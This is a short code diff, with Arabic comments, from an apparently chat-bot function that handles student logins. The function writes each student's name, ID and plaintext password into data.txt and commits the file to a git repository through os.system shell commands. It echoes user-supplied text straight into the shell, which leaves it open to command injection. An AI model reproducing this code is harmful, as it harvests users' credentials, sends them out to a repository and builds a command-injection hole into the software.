@@ -134,10 +134,11 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    file_path = 'information/data.txt'
+    name=data2["stuName"]
+    file_path = '/app/information/data.txt'  # المسار الكامل للملف
     content_to_write = f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n"
     commands = [
-    'cd information && git pull',  # اجلب التحديثات من GitHub
+    f'cd /app/information && git pull',  # اجلب التحديثات من GitHub
     f'echo "{content_to_write}" >> data.txt',  # إضافة المحتوى إلى الملف
     'git add data.txt',  # إضافة الملف للمرحلة
     'git commit -m "Add data for user"',  # التزام التغييرات
@@ -145,6 +146,7 @@ def send_sms(message, chat_id, number):
 ]
     for command in commands:
     	os.system(command)
+    
     
 
 
